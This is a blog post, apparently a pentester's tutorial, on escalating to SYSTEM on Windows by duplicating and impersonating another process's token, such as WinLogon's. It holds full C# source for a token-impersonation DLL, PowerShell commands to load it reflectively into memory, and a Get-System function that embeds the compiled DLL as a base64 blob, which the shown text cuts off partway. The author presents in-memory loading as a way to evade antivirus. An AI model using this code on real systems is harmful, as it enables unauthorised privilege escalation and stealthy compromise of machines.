---
layout: post
title:  "Windows API and Impersonation Part 2 - How to get SYSTEM using Impersonation Tokens"
date:   2018-09-21 17:53:01 -0300
categories: research
---

# Introduction

Hello again! Today I am going to spill out some new techniques about Windows impersonation. This time, we are going to use Impersonation tokens as a way to get SYSTEM.


# Impersonation token VS. Primary Token

In my previous blog post, I used Primary Tokens as a way to get access to a NT AUTHORITY\SYSTEM shell. You know the difference between them? If yes, skip this topic.

All processes have both Primary and Impersonation tokens. The main difference is that every time a new thread is created it both inherits Primary and Impersonation token from it's parent. But, primary tokens are impossible to be "swapped". You can duplicate it, but you can't "hot-swap" your primary token in the same process. There will be always the need to create a new process with a duplicated token. But this does not occurs with Impersonation tokens!

With Impersonation tokens, you can create a new thread, get a handle to a remote process Access token, grab it's Impersonation token and then swap it with your current thread (that is in your current process) Impersonation token! This would "turn" your process into SYSTEM process.

# Now it is PowerShell Time!

In the previous tutorial, I have used C++ and developed a executable file to spawn a SYSTEM process with CreateProcessTokenW. In this one, I will write a PowerShell script. That's because it will allow us to steal a Impersonation token and replace it with our, thus, we become SYSTEM in our current PowerShell shell!

# But hey, there is already a PowerShell script that does that!
Yes, I am aware. There is an excellent script made by a guy that I admire a lot (@Harmj0y) and all his work is AMAZING. But it is very over-looked by AV solutions, knowing how to bypass them and create your own is a must for a skillful pentester.

Also, in my script I am going to provide several functions that are not present in the above mentioned script, like checking the presence of Windows privileges.

Our big difference here will be that I will not import Windows API functions using PowerShell directly likes @Harmj0y does in his script. Instead, I will write a C# DLL that does all the hard work and then reflect it in memory, I prefer this method because of it's stealthiness and ratio of AV evasion.

# Wouldn't be more useful to learn AMSI bypass techniques and use Harmj0y's script?
Actually, it is useful to learn both. When one fails, you still have the other :P

In my next post, I intend to write about AMSI bypass techniques, so chill.

# Let's start
First , we will be relying too much on Windows API functions. The complete list is the following:

1. LookupPrivilege
2. AdjustTokenPrivilege
3. PrivilegeCheck
4. OpenProcess
5. OpenProcessToken
6. DuplicateToken
7. SetThreadToken

But as we are using PowerShell and C# to call Windows API, we are going to need to import structures as well, not only functions.

1. LUID_AND_ATTRIBUTES
2. PRIVILEGE_SET
3. LUID
4. TOKEN_PRIVILEGES

First, we need to import all this functions to be of use in a PowerShell session. We can easily import them using a nice website named "[pinvoke](https://pinvoke.net)". This is probably the most annoying part, as we need to declare EVERYTHING we use. Check my DLL c# code:

```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace zc00l
{
    public class ImpersonationToken
    {
        // Constants that are going to be used during our procedure.
        private const int ANYSIZE_ARRAY = 1;
        public static uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public static uint STANDARD_RIGHTS_READ = 0x00020000;
        public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;
        public static uint TOKEN_DUPLICATE = 0x00000002;
        public static uint TOKEN_IMPERSONATE = 0x00000004;
        public static uint TOKEN_QUERY = 0x00000008;
        public static uint TOKEN_QUERY_SOURCE = 0x00000010;
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static uint TOKEN_ADJUST_GROUPS = 0x00000040;
        public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;
        public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;
        public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;
        public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;

            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;
            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;
        }

        // Luid Structure Definition
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;
        }

        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PRIVILEGE_SET
        {
            public uint PrivilegeCount;
            public uint Control;  // use PRIVILEGE_SET_ALL_NECESSARY

            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privilege;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        // LookupPrivilegeValue
        [DllImport("advapi32.dll")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        // OpenProcess
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId);
        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
        {
            return OpenProcess(flags, false, proc.Id);
        }
        
        // OpenProcessToken
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        
        // DuplicateToken
        [DllImport("advapi32.dll")]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);
        
        // SetThreadToken
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

        // AdjustTokenPrivileges
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           UInt32 BufferLengthInBytes,
           ref TOKEN_PRIVILEGES PreviousState,
           out UInt32 ReturnLengthInBytes);

        // GetCurrentProcess
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool PrivilegeCheck(
            IntPtr ClientToken,
            ref PRIVILEGE_SET RequiredPrivileges,
            out bool pfResult
            );

        // Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P
        public static bool IsPrivilegeEnabled(string Privilege)
        {
            bool ret;
            LUID luid = new LUID();
            IntPtr hProcess = GetCurrentProcess();
            IntPtr hToken;
            if (hProcess == IntPtr.Zero) return false;
            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken)) return false;
            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;
            PRIVILEGE_SET privs = new PRIVILEGE_SET { Privilege = new LUID_AND_ATTRIBUTES[1], Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
            privs.Privilege[0].Luid = luid;
            privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
            if (!PrivilegeCheck(hToken, ref privs, out ret)) return false;
            return ret;
        }

        public static bool EnablePrivilege(string Privilege)
        {
            LUID luid = new LUID();
            IntPtr hProcess = GetCurrentProcess();
            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;
            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.
            LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };
            // Now we create a TOKEN_PRIVILEGES structure with our modifications
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[1] };
            tp.Privileges[0] = luAttr;
            TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES(); // Our old state.
            if (!AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;
            return true;
        }
        
        public static bool ImpersonateProcessToken(int pid)
        {
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);
            if (hProcess == IntPtr.Zero) return false;
            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) return false;
            IntPtr DuplicatedToken = new IntPtr();
            if (!DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
    }
}
```

A lot of code. But this is enough to impersonate to SYSTEM and check/enable privileges.

Compile the above code with Visual Studio or CSC.exe compiler (or even Add-Type in Powershell) to get hold a .DLL file.


**IMPORTANT NOTE**

I won't enter in too much detail here. It is very technical in a programming way and some would not understand. But understand one thing: 

To use this technique you will need to spawn a PowerShell shell with ApartmentState set to STA (Single Thread Apartment). By default, when spawning a PowerShell process, it will set it's apartment state to MTA (Multi Thread Apartment) and that will bogus our technique.

To spawn a Powershell process in STA mode, only add "-sta" flag to it.

```cmd
C:> powershell.exe -sta
```

To check your current ApartmentState in PowerShell use the following:

```powershell
PS C:\> [Threading.Thread]::CurrentThread.GetApartmentState()
STA
```

If the above output is MTA, you haven't spawned your powershell shell with -sta flag.


## C# DLL Reflection

With this DLL file, you can reflect it to memory using this technique.
```powershell
PS C:\> [System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\ImpersonationTokenDLL.dll"))

GAC    Version        Location
---    -------        --------
False  v4.0.30319
```

That will load all DLL code to my current PowerShell session, allowing to access everything I coded in C#.

You can check it by trying to access the zc00l.ImpersonationToken class using the following in PowerShell shell:

```powershell
PS C:\> [zc00l.ImpersonationToken]

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     False    ImpersonationToken                       System.Object
```

And then, also check that we can access our DLL public static functions too!

```powershell
PS C:\> [zc00l.ImpersonationToken]::IsPrivilegeEnabled

OverloadDefinitions
-------------------
static bool IsPrivilegeEnabled(string Privilege)

PS C:\> [zc00l.ImpersonationToken]::EnablePrivilege

OverloadDefinitions
-------------------
static bool EnablePrivilege(string Privilege)

PS C:\> [zc00l.ImpersonationToken]::ImpersonateProcessToken

OverloadDefinitions
-------------------
static bool ImpersonateProcessToken(int pid)
```

## How to get system using Impersonation Tokens

SYSTEM user is the most powerful user available in Windows systems. It is interesting, for a penetration tester, to get hold of this user during assessments.

With our DLL injected in-memory, we can grab "WinLogon.exe" token (Which is a process owned by SYSTEM and is not a "protected" process) to duplicate it and impersonate it to our current PowerShell thread.

![Screenshot](/assets/windows_api-03.jpg)

Boom! We are system.

## Enabling Windows Privileges

Even if you are Local Administrator, you CANNOT enable every privilege. Now that we are SYSTEM, all windows privileges are possible to be enabled in our current thread. 

If you want to enable a privilege using our DLL, you can use `[zc00l.ImpersonationToken]::EnablePrivilege("PrivilegeNameHere")` and it will try to enable it. Check the following screenshot:

![Screenshot](/assets/windows_api-02.JPG)

It is possible to see that "SeIncreaseQuotaPrivilege" is DISABLED. To enable it, just type: `[zc00l.ImpersonationToken]::EnablePrivilege("SeIncreaseQuotaPrivilege")`

![Screenshot](/assets/windows_api-04.jpg)

It is now enabled. Everything is possible for SYSTEM!

## Remember PowerShell?

We are already weaponized with C# Reflection. But it is not very practical. We can always automate things with scripting languages like PowerShell. So we are going to write a PowerShell script to automate this procedure and get SYSTEM more efficiently!

Check my PowerShell function:

```powershell
function Get-System 
{
    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') 
    {
        Write-Output "This powershell shell is not in STA mode!";
        return ;
    }

    if(-not ([System.Management.Automation.PSTypeName]"zc00l.ImpersonationToken").Type) {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("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nACfAAkAoACkAAkApACpAAkAqACuAAkArACzAAkAsAC4AC4ACwApAS4AEwAyAS4AGwBRAS4AIwBaAS4AKwB1AS4AMwB1AS4AOwB1AS4AQwBaAS4ASwB7AS4AUwB1AS4AWwB1AS4AYwCTAS4AawC9AS4AcwDKAeMAewByABMAwAAlAMAAKQDAADQAvQA8AL0AGgAiADwAXgAcBSkFAAEDALkEAQBAAQUAYAcCAEABCQC0BQEAAAELAHMFAQBAAQ0AZAUBAEABDwDUBgEAQAERAGwHAgBAARMA+wQBAASAAAABAAAAAAAAAAAAAAAAANsAAAAEAAAAAAAAAAAAAABpACkCAAAAAAQAAAAAAAAAAAAAAGkAWAUAAAAAAwACAAQAAgAFAAIABgACAAcAAgAnAFkAAAAAPE1vZHVsZT4AVE9LRU5fUkVBRABTVEFOREFSRF9SSUdIVFNfUkVBRABTRV9QUklWSUxFR0VfRU5BQkxFRABTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQAU0VfUFJJVklMRUdFX1JFTU9WRUQAVE9LRU5fQURKVVNUX1NFU1NJT05JRABMVUlEAFRPS0VOX1FVRVJZX1NPVVJDRQBUT0tFTl9EVVBMSUNBVEUAVE9LRU5fSU1QRVJTT05BVEUAU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTABJbXBlcnNvbmF0aW9uVG9rZW5ETEwAUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTgBUT0tFTl9QUklWSUxFR0VTAFRPS0VOX0FESlVTVF9QUklWSUxFR0VTAExVSURfQU5EX0FUVFJJQlVURVMAVE9LRU5fQURKVVNUX0dST1VQUwBUT0tFTl9BTExfQUNDRVNTAFNFX1BSSVZJTEVHRV9VU0VEX0ZPUl9BQ0NFU1MAUFJJVklMRUdFX1NFVABUT0tFTl9BREpVU1RfREVGQVVMVABTRV9QUklWSUxFR0VfRU5BQkxFRF9CWV9ERUZBVUxUAEFOWVNJWkVfQVJSQVkAVE9LRU5fQVNTSUdOX1BSSU1BUlkAUFJJVklMRUdFX1NFVF9BTExfTkVDRVNTQVJZAFRPS0VOX1FVRVJZAHZhbHVlX18AU2V0UXVvdGEAbXNjb3JsaWIAcHJvYwBnZXRfSWQAcHJvY2Vzc0lkAFZpcnR1YWxNZW1vcnlSZWFkAENyZWF0ZVRocmVhZABJc1ByaXZpbGVnZUVuYWJsZWQAcGlkAGxwTHVpZABFbmFibGVQcml2aWxlZ2UARHVwbGljYXRlSGFuZGxlAER1cGxpY2F0ZVRva2VuSGFuZGxlAEV4aXN0aW5nVG9rZW5IYW5kbGUAcEhhbmRsZQBQcm9jZXNzSGFuZGxlAGJJbmhlcml0SGFuZGxlAGxwU3lzdGVtTmFtZQBscE5hbWUAVmFsdWVUeXBlAFRlcm1pbmF0ZQBQcmV2aW91c1N0YXRlAE5ld1N0YXRlAFZpcnR1YWxNZW1vcnlXcml0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBMb29rdXBQcml2aWxlZ2VWYWx1ZQBTeW5jaHJvbml6ZQBTaXplT2YAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBQcml2aWxlZ2VDaGVjawB6YzAwbABNYXJzaGFsAEFsbABhZHZhcGkzMi5kbGwAa2VybmVsMzIuZGxsAEltcGVyc29uYXRpb25Ub2tlbkRMTC5kbGwAQ29udHJvbABTeXN0ZW0ARW51bQBTZXRUaHJlYWRUb2tlbgBEdXBsaWNhdGVUb2tlbgBoVG9rZW4ASW1wZXJzb25hdGlvblRva2VuAEltcGVyc29uYXRlUHJvY2Vzc1Rva2VuAE9wZW5Qcm9jZXNzVG9rZW4AQ2xpZW50VG9rZW4AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb24AU2V0SW5mb3JtYXRpb24AUXVlcnlJbmZvcm1hdGlvbgBWaXJ0dWFsTWVtb3J5T3BlcmF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFplcm8ALmN0b3IALmNjdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAUmVxdWlyZWRQcml2aWxlZ2VzAERpc2FibGVBbGxQcml2aWxlZ2VzAEFkanVzdFRva2VuUHJpdmlsZWdlcwBBdHRyaWJ1dGVzAFJldHVybkxlbmd0aEluQnl0ZXMAQnVmZmVyTGVuZ3RoSW5CeXRlcwBQcm9jZXNzQWNjZXNzRmxhZ3MAZmxhZ3MARGVzaXJlZEFjY2VzcwBwcm9jZXNzQWNjZXNzAENyZWF0ZVByb2Nlc3MAT3BlblByb2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAT2JqZWN0AHBmUmVzdWx0AFByaXZpbGVnZUNvdW50AEhpZ2hQYXJ0AExvd1BhcnQAb3BfRXF1YWxpdHkAAAAAAAAANMB5wx4YykSS6Z0DEn72xgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECAwcBGAMgAAgQBwsCERAYGBEYAgICAhEYAgIGGAUAAgIYGBUHDREQGBgRDBEUERQJAgICEQwRFAIGEAEBCB4ABAoBERQKBwgYGBgCAgICAgi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQAAACABP8PHwAECAAAAAQQAAAABCAAAAAEQAAAAASAAAAABAABAAAEAAIAAAQABAAABAAQAAAEAAAQAAIeAQECAgYIAgYJAwYREAQGHREMAwYRHAgAAwIODhAREAcAAxgRHAIIBwACGBJFERwHAAMCGAkQGAcAAwIYCBAYDgAGAhgCEBEUCRARFBAJAwAAGAkAAwIYEBEYEAIEAAECDgQAAQIIAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAaAQAVSW1wZXJzb25hdGlvblRva2VuRExMAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDE4AAApAQAkZDUzNGM1NTgtNDNjYy00ZGEyLWE3NTUtMDYyMTM1ZDA2NzE4AAAMAQAHMS4wLjAuMAAATQEAHC5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC41LjIBAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lFC5ORVQgRnJhbWV3b3JrIDQuNS4yAAAAAP9SNtQAAAAAAgAAAIEAAADgMwAA4BUAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTtwWwQJTNz0WcHiOfEy1IZwEAAABDOlxVc2Vyc1xhbmRyZVxzb3VyY2VccmVwb3NcVG9rZW5JbXBlcnNvbmF0aW9uXEltcGVyc29uYXRpb25Ub2tlbkRMTFxvYmpcRGVidWdcSW1wZXJzb25hdGlvblRva2VuRExMLnBkYgCJNAAAAAAAAAAAAACjNAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlTQAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAHwDAAAAAAAAAAAAAHwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsATcAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAC4AgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAVAAWAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AVABvAGsAZQBuAEQATABMAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAVAAaAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABJAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAFQAbwBrAGUAbgBEAEwATAAuAGQ